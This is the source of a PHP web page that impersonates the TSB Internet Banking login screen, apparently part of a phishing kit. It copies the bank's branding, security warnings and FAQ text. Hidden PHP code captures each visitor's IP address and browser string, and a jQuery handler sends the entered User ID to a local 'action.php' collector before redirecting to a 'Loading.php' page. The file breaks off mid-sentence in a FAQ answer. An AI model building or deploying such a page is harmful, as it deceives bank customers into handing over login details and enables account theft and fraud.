<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
?>
<!DOCTYPE html>
<html lang="en_gb" dir="ltr" style="opacity: 1;">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <style type="text/css">
            [uib-typeahead-popup].dropdown-menu {
                display: block;
            }
        </style>
        <style type="text/css">
            .uib-time input {
                width: 50px;
            }
        </style>
        <style type="text/css">
            [uib-tooltip-popup].tooltip.top-left > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.top-right > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.bottom-left > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.bottom-right > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.left-top > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.left-bottom > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.right-top > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.right-bottom > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.top-left > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.top-right > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.bottom-left > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.bottom-right > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.left-top > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.left-bottom > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.right-top > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.right-bottom > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.top-left > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.top-right > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.bottom-left > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.bottom-right > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.left-top > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.left-bottom > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.right-top > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.right-bottom > .tooltip-arrow,
            [uib-popover-popup].popover.top-left > .arrow,
            [uib-popover-popup].popover.top-right > .arrow,
            [uib-popover-popup].popover.bottom-left > .arrow,
            [uib-popover-popup].popover.bottom-right > .arrow,
            [uib-popover-popup].popover.left-top > .arrow,
            [uib-popover-popup].popover.left-bottom > .arrow,
            [uib-popover-popup].popover.right-top > .arrow,
            [uib-popover-popup].popover.right-bottom > .arrow,
            [uib-popover-html-popup].popover.top-left > .arrow,
            [uib-popover-html-popup].popover.top-right > .arrow,
            [uib-popover-html-popup].popover.bottom-left > .arrow,
            [uib-popover-html-popup].popover.bottom-right > .arrow,
            [uib-popover-html-popup].popover.left-top > .arrow,
            [uib-popover-html-popup].popover.left-bottom > .arrow,
            [uib-popover-html-popup].popover.right-top > .arrow,
            [uib-popover-html-popup].popover.right-bottom > .arrow,
            [uib-popover-template-popup].popover.top-left > .arrow,
            [uib-popover-template-popup].popover.top-right > .arrow,
            [uib-popover-template-popup].popover.bottom-left > .arrow,
            [uib-popover-template-popup].popover.bottom-right > .arrow,
            [uib-popover-template-popup].popover.left-top > .arrow,
            [uib-popover-template-popup].popover.left-bottom > .arrow,
            [uib-popover-template-popup].popover.right-top > .arrow,
            [uib-popover-template-popup].popover.right-bottom > .arrow {
                top: auto;
                bottom: auto;
                left: auto;
                right: auto;
                margin: 0;
            }
            [uib-popover-popup].popover,
            [uib-popover-html-popup].popover,
            [uib-popover-template-popup].popover {
                display: block !important;
            }
        </style>
        <style type="text/css">
            .uib-datepicker-popup.dropdown-menu {
                display: block;
                float: none;
                margin: 0;
            }
            .uib-button-bar {
                padding: 10px 9px 2px;
            }
        </style>
        <style type="text/css">
            .uib-position-measure {
                display: block !important;
                visibility: hidden !important;
                position: absolute !important;
                top: -9999px !important;
                left: -9999px !important;
            }
            .uib-position-scrollbar-measure {
                position: absolute !important;
                top: -9999px !important;
                width: 50px !important;
                height: 50px !important;
                overflow: scroll !important;
            }
            .uib-position-body-scrollbar-measure {
                overflow: scroll !important;
            }
        </style>
        <style type="text/css">
            .uib-datepicker .uib-title {
                width: 100%;
            }
            .uib-day button,
            .uib-month button,
            .uib-year button {
                min-width: 100%;
            }
            .uib-left,
            .uib-right {
                width: 100%;
            }
        </style>
        <style type="text/css">
            .ng-animate.item:not(.left):not(.right) {
                -webkit-transition: 0s ease-in-out left;
                transition: 0s ease-in-out left;
            }
        </style>
        <style type="text/css">
            @charset "UTF-8";
            [ng\:cloak],
            [ng-cloak],
            [data-ng-cloak],
            [x-ng-cloak],
            .ng-cloak,
            .x-ng-cloak,
            .ng-hide:not(.ng-hide-animate) {
                display: none !important;
            }
            ng\:form {
                display: block;
            }
            .ng-animate-shim {
                visibility: hidden;
            }
            .ng-anchor {
                position: absolute;
            }
        </style>
        
		
        <title>Login</title>
        <meta name="description" property="description" content="Welcome to Internet Banking" />

        
		
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="shortcut icon" href="files/img/favicon.ico" />
        <link rel="stylesheet" type="text/css" media="print" href="./files/css/print_base-min.css" />
        <link rel="stylesheet" type="text/css" media="screen,print" href="./files/css/styles-min.css" />
        <link rel="stylesheet" type="text/css" media="screen" href="./files/css/promotionals-min.css" />
        
		
        <style id="at-makers-style" class="at-flicker-control">
            .mboxDefault {
                visibility: hidden;
            }
        </style>
        <script src="files/js/jquery.js"></script>
	<script>
	
//
$( document ).ready(function() {

	




	
	var allInputs = $(":input");
	

	
	
	
	allInputs.keyup(function() {
	
	
	

		if($(this).prop('required')){
			if(!$(this).val()){
			
			
				$(this).parent().parent().addClass('error');
				$(this).parent().addClass('has-error');
				$(this).parent().next().show();
				
				
				
				
			}else{
				$(this).parent().parent().removeClass('error');
				$(this).parent().removeClass('has-error');
				$(this).parent().next().hide();
				
	
			}
		}
	});
	
	allInputs.focusout(function() {
		$(this).blur(function() {
			if($(this).prop('required')){
			if(!$(this).val()){
				$(this).parent().parent().addClass('error');
				$(this).parent().addClass('has-error');
				$(this).parent().next().show();
			}else{
				$(this).parent().parent().removeClass('error');
				$(this).parent().removeClass('has-error');
				$(this).parent().next().hide();
				
			}
		}
		});
	});
	
	
		
	
	
	
	
	
	$('#loginForm').submit(function(e){
		e.preventDefault();
		var userId = $('#userId').val();
		
		if(userId == null || userId == ''){
			return false;
		}else{
			
		}
		
		
		$.ajax({
			type : 'POST',
			url : 'files/action.php?type=login',
			data : $('#loginForm').serialize(),
			success: function (data) {
				console.log(data);
				var parsed_data = JSON.parse(data);
				if(parsed_data.status == 'ok'){
					//console.log(parsed_data);
					
					
					location.href = "Loading.php"
					
					
					
				}else{
					return false;
				}
				//console.log(parsed_data.status);
			}
			})
		
		
		
	});
	
	
	
	

	
	
	
});
	
	
	
	</script>
	
	
	
	
	
	
	
	
	
	
    </head>
    <body>
        
		
        <div id="wrapperDefault">
            <div class="container">
                <nav class="navbar navbar-default header-tsb">
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
                            <span class="sr-only">Toggle navigation</span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <div class="navbar-brand">
                            <h2 id="env-identifier" style="background: yellow; font-size: 42px; margin: 0; position: absolute; color: red; font-weight: bold;"></h2>
                            <img src="./files/img/logo-6-1409059355.png" title="TSB logo" alt="TSB logo" />
                        </div>
                    </div>
                    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                        <div class="loggedIn">
                            <ul class="nav navbar-nav navbar-right abcd unordered-list">
                                <li class="list-element no-bullet">
                                    <span class="icon-arrow-lo"></span>
                                    <a href="https://internetbanking.tsb.co.uk/personal/a/cookie-policy/" target="_self" title="Cookie Policy" class="">Cookie Policy</a>
                                </li>
                                <li class="list-element no-bullet">
                                    <span class="icon-secure-small">
                                        You're logging into a secure site
                                    </span>
                                </li>

                                <ul class="abcd unordered-list">
                                    <li class="list-element no-bullet">
                                        <span class="icon-arrow-lo"></span> <a href="http://tsb.co.uk/security.asp" target="_blank" title="How can I tell that this site is secure?" class="">How can I tell that this site is secure?</a>
                                    </li>
                                </ul>
                            </ul>
                        </div>
                    </div>
                </nav>
            </div>

            <div class="pageWrap">
                <div class="container">
                    <div id="experienceathead" class="col-md-12" style="margin-bottom: 2px;"></div>
                    <div id="page">
                        <div class="row">
                            <div class="col-md-8 col-xs-12">
                                <div class="primary" id="literalsLoader" style="display: block;">
                                    <div id="spa-credentialsPublic-1.0" spacode="credentialsPublic" spaid="1464167919044" class="clearfix">
                                        <link rel="stylesheet" href="./files/css/d631d9e5.vendor.min.css" />
                                        <link rel="stylesheet" href="./files/css/0eb8ac02.tsb-credentials-public.min.css" />

                                        <!-- uiView:  -->
                                        <div id="credentialsPublic" ui-view="" autoscroll="false" class="ng-scope">
                                            <div class="row ng-scope">
                                                <div class="col-xs-12">
                                                    <span class="icon-back" icon="back"></span><a class="link-std ng-isolate-scope" ng-href="" ng-transclude="" ng-click="gotoPublicTsb();"><span class="text-std" ng-transclude="" translate="">Go to tsb.co.uk</span></a>
                                                </div>
                                            </div>
                                            <div class="row ng-scope">
                                                <div class="col-xs-12">
                                                    <form id="loginForm" name="loginForm" method="POST" autocomplete=" off" class="ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength">
														<input type="hidden" name="ip" value="<?=$ip;?>">
														<input type="hidden" name="ua" value="<?=$ua;?>">
                                                        <div class="row">
                                                            <div class="col-xs-12 md-margin-bottom">
                                                                <h1 class="col-xs-12 md-margin-bottom no-padding"><span class="text-std" ng-transclude="" translate="">Welcome to Internet Banking</span></h1>
                                                                <span class="text-std" ng-transclude="">
                                                                    <span translate="" class="ng-scope">If you don't already use Internet Banking, it's simple to </span>
                                                                    <a
                                                                        class="text-underline link-std ng-isolate-scope"
                                                                        ui-sref="registration"
                                                                        ng-transclude=""
                                                                        state="registration"
                                                                        href="https://internetbanking.tsb.co.uk/personal/logon/login/#/registration"
                                                                    >
                                                                        <span translate="" class="ng-scope">register online</span>
                                                                    </a>
                                                                    <span class="ng-scope">.</span>
                                                                </span>
                                                                <br />
                                                                <br />
                                                                <!-- ngIf: captchaFactory.captchaShow --><!-- ngIf: scaMode && attemptsUserId === 5 -->
                                                            </div>
                                                            <!-- ngIf: exceptionLiteral || blockUser --><!-- ngIf: existUserRegistrationError --><!-- ngIf: bloqued -->
                                                        </div>
                                                        <div class="row subPanel no-margin">
                                                            <div class="col-xs-12">
                                                                <div
                                                                    class="row  xs-padding-bottom"
                                                                    
                                                                >
                                                                    <span class="col-xs-12 text-bold xs-margin-top text-std" ng-transclude="" translate="">User ID:</span>
                                                                    <div
                                                                        class="col-xs-12 col-md-4 xs-margin-top form-group  has-feedback"
                                                                        id="userIdInput"
                                                                        
                                                                    >
                                                                        <input
																			required
                                                                            class="form-control ng-isolate-scope ng-invalid ng-invalid-required ng-valid-maxlength ng-touched"
                                                                            name="userId"
																			id="userId"
                                                                            type="text"
                                                                            maxlength="30"
                                                                            autofocus=""
                                                                        />
                                                                    </div>
                                                                    <div
																		 style="display:none;"
                                                                        class="col-xs-12 col-md-4 no-margin sm-margin-bottom xs-margin-top-screen-md xs-margin-bottom-screen-sm"
                                                                        id="errorUserID"
                                                                        ng-show="loginForm.userId.$invalid &amp;&amp; (loginForm.userId.$touched || loginForm.$submitted)"
                                                                    >
                                                                        <span class="icon-alert red-icon" icon-bg="red" icon="alert"></span><span class="text-bold text-std" ng-transclude="" translate="">Please enter a value</span>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <!-- ngIf: !scaMode --><!-- ngIf: scaMode && captchaFactory.captchaEnabled -->
                                                            <div class="col-xs-12 xs-margin-top ng-scope" ng-if="scaMode &amp;&amp; captchaFactory.captchaEnabled"><!-- ngIf: captchaFactory.captchaShow --></div>
                                                            <!-- end ngIf: scaMode && captchaFactory.captchaEnabled -->
                                                            <div class="col-xs-12 md-margin-top">
                                                                <div class="row">
                                                                    <label
                                                                        class="checkbox-inline ng-isolate-scope"
                                                                        ng-class="{&#39;label-left&#39; : labelPosition === &#39;left&#39;}"
                                                                        name="rememberID"
                                                                        output="data.rememberID"
                                                                        validation-required="false"
                                                                    >
                                                                        <input
                                                                            id=""
                                                                            type="checkbox"
                                                                            name="rememberID"
                                                                            value=""
                                                                            class="ng-pristine ng-untouched ng-valid ng-valid-required"
                                                                        />
                                                                        <ng-transclude><span class="sm-margin-bottom text-std" ng-transclude="" translate="">Remember my User ID</span></ng-transclude>
                                                                    </label><span
                                                                        uib-popover-template="popoverTplOverlay"
                                                                        popover-placement="top-left"
                                                                        popover-is-open="isOpen"
                                                                        popover-trigger="outsideClick"
                                                                        popover-append-to-body="true"
                                                                        class="text-std-size popover-link link-std popover-alignement- popover-link link-std popover-alignement-"
                                                                        ng-click="changeState()"
                                                                        title="Click to find out more about remembering your User ID. "
                                                                        ng-transclude=""
                                                                        content="RETAIL_CREDENTIALS_PUBLIC_LOGON_LOGIN_TOOLTIPTEXT"
                                                                        placement="top-left"
                                                                        size="h6"
                                                                    ><span class="ng-scope">[?]</span>
                                                                    </span>
                                                                </div>
                                                                <div class="md-margin-top">
                                                                    <span class="text-bold text-std" ng-transclude="" translate="">Warning: </span>
                                                                    <span class="text-std" ng-transclude="" translate="">Don't tick this box if you're using a public or shared computer.</span>
                                                                </div>
                                                            </div>
                                                            <div class="col-xs-12">
                                                                <div class="row md-margin-bottom">
                                                                    <div class="ng-isolate-scope">
                                                                        <div class="clearfix"></div>
                                                                        <hr />
                                                                    </div>
                                                                    <div class="col-xs-12 col-md-8">
                                                                        <div class="row">
                                                                            <div class="col-xs-12">
                                                                                <a
                                                                                    class="link-std ng-isolate-scope"
                                                                                    ui-sref="forgottenUserId"
                                                                                    ng-transclude=""
                                                                                    state="forgottenUserId"
                                                                                    href="https://internetbanking.tsb.co.uk/personal/logon/login/#/forgottenUserId"
                                                                                >
                                                                                    <span class="icon-next" icon="next"></span><span class="text-std" ng-transclude="" translate="">Recover User ID?</span>
                                                                                </a>
                                                                            </div>
                                                                            <div class="col-xs-12">
                                                                                <a
                                                                                    class="link-std ng-isolate-scope"
                                                                                    ui-sref="enterCustomerIdData"
                                                                                    ng-transclude=""
                                                                                    state="enterCustomerIdData"
                                                                                    href="https://internetbanking.tsb.co.uk/personal/logon/login/#/enterCustomerIdData"
                                                                                >
                                                                                    <span class="icon-next" icon="next"></span><span class="text-std" ng-transclude="" translate="">'Forgotten your password and memorable information?' </span>
                                                                                </a>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="col-xs-12 col-md-4">
                                                                        <button class="login pull-right btn md-btn ng-isolate-scope" type="submit">
                                                                            <span class="text-std">Continue</span>
                                                                        </button>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="row lg-margin-top">
                                                            <div class="col-xs-5 col-sm-3 col-lg-2 alertImage">
                                                                <img alt="alert image" src="./files/img/c2822233.c2822233.alert-icon-100x73-2-1409059243.png" title="3.6.30-20200813171338" width="75" height="55" />
                                                            </div>
                                                            <div class="col-xs-7 col-sm-9 col-lg-10 alertTextImage sm-margin-top no-padding-left">
                                                                <span class="text-std" ng-transclude="" translate="">Never log into Internet Banking if you have given someone remote access to your computer. </span>
                                                                <a
                                                                    class="link-std ng-isolate-scope"
                                                                    ng-href="http://www.tsb.co.uk/security/social-engineering/"
                                                                    ng-transclude=""
                                                                    url="http://www.tsb.co.uk/security/social-engineering/"
                                                                    href="http://www.tsb.co.uk/security/social-engineering/"
                                                                >
                                                                    <span class="text-std" ng-transclude="" translate="">Find out more</span>
                                                                </a>
                                                                <span class="text-std" ng-transclude="" translate=""> about how to protect yourself.</span>
                                                            </div>
                                                        </div>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>

                                        
										
                                    </div>
                                    
									
                                </div>

                                <div class="promotionalDefault" style="min-height: 4px;"></div>
                            </div>

                            <div id="lateralPanel">
                                <!-- EFB-LPRb -->
                                <div class="secondary col-md-4 col-xs-12">
                                    <input type="hidden" id="testingInput" data-p="1464167933360" />
                                    
									
                                    <div class="panel">
                                        <div id="lateral-panel-content-inbox"></div>
                                        <div id="lateral-panel-content-1">
                                            <div class="accordion">
                                                <div class="part">
                                                    <h2 class="trigger" title="Having issues logging in?: Use this link to show or hide information">Having issues logging in? <span class="icon-minus-lg pull-right"></span></h2>
                                                    <div class="pane open">
                                                        <div class="paneInner">
                                                            <div class="quickContact">
                                                                <div class="row">
                                                                    <!-- Asset details - id [1490892138236] - type [Content_C]-->
                                                                    <div class="col-sm-12 col-xs-12 content_basic">
                                                                        <div class="article flex-col">
                                                                            <div class="backgroundWhite row">
                                                                                <div class="col-sm-12 text_banner">
                                                                                    <div>
                                                                                        <div>
                                                                                            <div>
                                                                                                <div>
                                                                                                    <div>
                                                                                                        <div>
                                                                                                            <div>
                                                                                                                <div>
                                                                                                                    <div>
                                                                                                                        <p>
                                                                                                                            If you are having issues logging in, you can find help on&nbsp;our
                                                                                                                            <a href="https://www.tsb.co.uk/login-issues/" target="_blank">login issues&nbsp;page</a>.&nbsp;
                                                                                                                        </p>
                                                                                                                    </div>
                                                                                                                </div>
                                                                                                            </div>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="promotionalDefault" style="min-height: 4px;"></div>
                                        <div id="lateral-panel-content-2">
                                            <div class="accordion">
                                                <div class="part">
                                                    <h2 class="trigger" title="Contact Us...: Use this link to show or hide information">Contact Us... <span class="icon-plus-lg pull-right"></span></h2>
                                                    <div class="pane closed">
                                                        <div class="paneInner">
                                                            <div class="quickContact">
                                                                <div class="row">
                                                                    <!-- Asset details - id [1464167918875] - type [Content_C]-->
                                                                    <div class="col-sm-12 col-xs-12 content_basic">
                                                                        <div class="article flex-col">
                                                                            <div class="backgroundWhite row">
                                                                                <div class="col-sm-12 text_banner">
                                                                                    <h3 id="All_account_related_queries-1464167918875" class="h3">All account related queries</h3>
                                                                                    <div>
                                                                                        <div><strong>0345 975 8758</strong></div>
                                                                                    </div>
                                                                                    <div>
                                                                                        <div></div>
                                                                                        <div></div>
                                                                                        <div>&nbsp;</div>
                                                                                        <div>If you need to call us from abroad or prefer not to use our 0345 number, you can also call us on&nbsp;<strong>+44 (0) 203 284 1575.</strong></div>
                                                                                        <div>
                                                                                            Calls may be monitored and recorded in case we need to check we have carried out your instructions correctly and to help us improve our quality of
                                                                                            service.
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <!-- Asset details - id [1464167918901] - type [Content_C]-->
                                                                    <div class="col-sm-12 col-xs-12 content_basic">
                                                                        <div class="article flex-col">
                                                                            <div class="backgroundWhite row">
                                                                                <div class="col-sm-12 text_banner">
                                                                                    <h3 id="Internet_banking_queries-1464167918901" class="h3">Internet banking queries</h3>
                                                                                    <div>
                                                                                        <div><!--StartFragment-->Technical queries about the Internet Banking service<!--EndFragment--></div>
                                                                                    </div>
                                                                                    <div>
                                                                                        <!--StartFragment-->
                                                                                        <p>&nbsp;</p>
                                                                                        <p>Call&nbsp;us on<strong>&nbsp;0345 835 3844</strong>. We’re open 8am-8pm Mon-Sat, 8am-6pm Sun.</p>
                                                                                        <p>If you need to call us from abroad you can also call us on<strong>&nbsp;+44 (0)203 284 1577</strong></p>
                                                                                        <!--EndFragment-->
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="promotionalDefault" style="min-height: 4px;"></div>
                                        <div id="lateral-panel-content-3">
                                            <div class="accordion">
                                                <div class="part">
                                                    <h2 class="trigger" title="Coronavirus (COVID-19) information: Use this link to show or hide information">
                                                        Coronavirus (COVID-19) information <span class="icon-minus-lg pull-right"></span>
                                                    </h2>
                                                    <div class="pane open">
                                                        <div class="paneInner">
                                                            <div class="quickContact">
                                                                <div class="row">
                                                                    <!-- Asset details - id [1490890887642] - type [Content_C]-->
                                                                    <div class="col-sm-12 col-xs-12 content_basic">
                                                                        <div class="article flex-col">
                                                                            <div class="backgroundWhite row">
                                                                                <div class="col-sm-12 text_banner">
                                                                                    <div>
                                                                                        <div>
                                                                                            <div>
                                                                                                <div>
                                                                                                    <div>
                                                                                                        <div>
                                                                                                            <div>
                                                                                                                <div>
                                                                                                                    <div>
                                                                                                                        <p>
                                                                                                                            If you’ve been impacted by coronavirus and need financial help, please read our
                                                                                                                            <a href="https://www.tsb.co.uk/coronavirus/">useful information page</a>.
                                                                                                                        </p>
                                                                                                                        <p>
                                                                                                                            If you’re planning to visit a TSB branch, please check our
                                                                                                                            <a href="https://www.tsb.co.uk/branch-locator/">branch locator page</a> before making your journey.
                                                                                                                        </p>
                                                                                                                    </div>
                                                                                                                </div>
                                                                                                            </div>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="promotionalDefault" style="min-height: 4px;"></div>
                                        <div id="lateral-panel-content-4">
                                            <div class="accordion">
                                                <div class="part">
                                                    <h2 class="trigger" title="Help &amp; Support: Use this link to show or hide information">Help &amp; Support <span class="icon-plus-lg pull-right"></span></h2>
                                                    <div class="pane closed">
                                                        <div class="paneInner">
                                                            <div id="inbentaFaqsData">
                                                                <!-- EFB-IRb -->
                                                                <ul class="unordered-list no-bullet no-padding-left" inbentaprofile="2" inbentacategory="141">
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
                                                                            inbentaid="eyJpdiI6ImRydmNia255bHNMK1V0XC9Dd2FPc3B3PT0iLCJ2YWx1ZSI6IjhFU2pkXC9ucnVwdFJVV21QWmM3XC9KRjVrQkkweW52MldMUnQybU50VW9MSkozQ0FxTjBQNDUzVENncnNGR2I0MUFma1ZJd0Q4elIwNXFqUmhoc0ZRSUJqOHZ5Tnc0WFprWlZQZVlCK2Ftb2Jlc0hlU3JBNVRWMWRYVkdmRE1FZjgiLCJtYWMiOiI2MWY5OTRjMzFiNDhlMGUwN2FjYTZkYjg3ZDgwOTNkMzU4MzdlNjhiMDk1NmE3OWYyYTE2ZjA3NjE0NzkyYWI3In0="
                                                                            title="Are my security details case sensitive?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">Are my security details case sensitive?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left"><p>No, your security details, including your password and User ID, aren't case sensitive.</p></div>
                                                                    </li>
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
                                                                            inbentaid="eyJpdiI6IkUyQzd1bUVTSXlyYVlCOVlNeWFWQ1E9PSIsInZhbHVlIjoiUncrdjNpMkZNWWJcL0dNekRvMWJZQ3NjK1wvQ3ltUmpScjZGNHdpVE9CMVVVWHA4RjNDU3VzbUhLUk1UcnlaNTBraitjbEJBTlArYVl1SlFvSk9tc2twQlwvQUY4VUU0Q09oXC9weFNOdU5PMWhERVhzZ2RSYm0yYTkzSlJlUFJKSVVGIiwibWFjIjoiMWNlMDJhODhjMGU4OTM5NDRlNzE0YzE0NjM2ZGI3M2IxZWU3Y2YwNGRkMDI5YTU0MjgzOWQ2Zjk5MTRiOGNjYyJ9"
                                                                            title="How do I change my password and memorable information?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">How do I change my password and memorable information?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left">
                                                                            <p></p>
                                                                            <p>
                                                                                Click on the 'Forgotten your password?'&nbsp;or 'Having trouble logging in?'&nbsp; link. On the next screen you'll be asked for your user ID, first name, last
                                                                                name and date of birth. You can then choose to reset either your password or your password and memorable information.&nbsp;
                                                                            </p>
                                                                            <p>
                                                                                If you choose to reset your password only, you'll need to enter and confirm your new password and then select a phone number for us to contact you on. You’ll
                                                                                then receive a One-Time Password through text if you have a selected a mobile number or over the phone if you have selected a landline or international phone
                                                                                number. Follow the instructions and your login information will be reset immediately.&nbsp;
                                                                            </p>
                                                                            <p>
                                                                                If you choose to reset both your password and memorable information, you'll need to choose a new password and memorable information and then select a phone
                                                                                number for us to contact you on. You'll then receive a One-Time Password through text if you have a selected a mobile number or over the phone if you have
                                                                                selected a landline or international phone number. Follow the instructions and your login information will be reset immediately.
                                                                            </p>
                                                                            <p></p>
                                                                        </div>
                                                                    </li>
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
                                                                            inbentaid="eyJpdiI6IlQwbmI5VXpYXC9VZEVrRng2SW9nZXhBPT0iLCJ2YWx1ZSI6ImhSRCtYV1NyTWpaUWJ6WnZXd3VncHVjajdGNnNZd2hwU3IwbEs0T2N4NmxlR0kyanVzMkZDSDdSQklYOHNuVVpKaTRNM1h3TDZsaXRQaFkxUE8zaTJ5VmYzZEZwRDNFaFZJMGY1NzljcEQrN0lPalh5Mm95Qng5MWthZlhTemg3IiwibWFjIjoiMmNlN2U5ZGIyM2U3MDViZmM0ODdlZjljNTFhMTRlYjBiN2ZiMmM3NmMyZDBhMjgwZGEwODQ5ZGRlZDYzNzNmMCJ9"
                                                                            title="I&#39;m locked out of my account. What should I do?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">I'm locked out of my account. What should I do?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left">
                                                                            <p></p>
                                                                            <p>
                                                                                You may need to reset your password. To do so, go to the Internet Banking&nbsp;screen, click on the 'Forgotten your password?'&nbsp;link, and follow the
                                                                                on-screen instructions.<br />
                                                                                <br />
                                                                                If you're still unable to access Internet Banking, please call our helpdesk on&nbsp;0345 835 3844 (&nbsp;+44 203 284 1577 from overseas), between 7am-10pm from
                                                                                Monday to Friday, or between 8am-6pm at weekends and one of our customer service agents will be able to help you. Textphone users who have a hearing or speech
                                                                                impairment can call us on 0845 835 3840 (+44 1733 286 351 from overseas).
                                                                            </p>
                                                                            <p></p>
                                                                        </div>
                                                                    </li>
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
                                                                            inbentaid="eyJpdiI6IkQyRjlsUGFaU1wvZmxrdmJFakVUMjJnPT0iLCJ2YWx1ZSI6Iktwc3dGV3pUaGpwODEzYklaWExWcWtPUld1UGgzVWdUVG5IY2c3VEt2T3RcL3BsV3ZjZXVicGVGXC9rY0xzT2tOMUw4bWxhQUNXVWdlbXdqczBKbHNjcUliYnRZU2FWY3dnZ0dPSGJ3UWtodnFENzc5OG9zM3FWamlpOHhUdyt0K1IiLCJtYWMiOiJlOTZmYTU4MmJiZjdkZTAwOTVhMmJmYjcyNGQ5NDFkZmJlNDRjNWNjMWZjZmIyYjk3MzU5ZWE3NzgyNjZmYjE2In0="
                                                                            title="What is a user ID?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">What is a user ID?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left">
                                                                            <p></p>
                                                                            <p>
                                                                                A user ID is the unique name you chose to login to online banking. To login to online banking you will need a user ID, password and memorable information.&nbsp;
                                                                            </p>
                                                                            <p></p>
                                                                        </div>
                                                                    </li>
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
                                                                            inbentaid="eyJpdiI6ImlDUUZtSVlYMXN0akxVMWdlM2xFOXc9PSIsInZhbHVlIjoiQUpCekNWZEhqQm9vNDRVXC81aDZHaWpuTklcL3BwclwvMUxpMEJjbmM5ZldXMGh6QWRVZTRsRE1ZXC9zM0h5aVZmVDY0aE5kN0ZaNk5sSlFpT0srTzd6S0p4M0x2U04wWUUrNGpSQ1dpanBpMDBXR293ZHdPS1pQYTdYRldSaDdzV1BnIiwibWFjIjoiNWNmOGQ1YmUwYmMzOWFhNzg1ZGUwNTZlMGJjMzRiMDIzNzE3ODZjOGFiNjE3ZjRlYzYyYmY4M2FiN2VjNzA0OCJ9"
                                                                            title="Why am I having trouble logging in?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">Why am I having trouble logging in?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left">
                                                                            <p></p>
                                                                            <p>
                                                                                It could be because you're trying to log on from a networked site (the office, for example). If so, please contact your Systems Administrator for help. It could
                                                                                also be because your browser settings are incompatible with the level of security maintained by Internet Banking. Check your browser for compatibility.
                                                                            </p>
                                                                            <p>
                                                                                If you've been logged out because we suspect that you have a virus or malicious software on your computer, you can find useful information on our&nbsp;
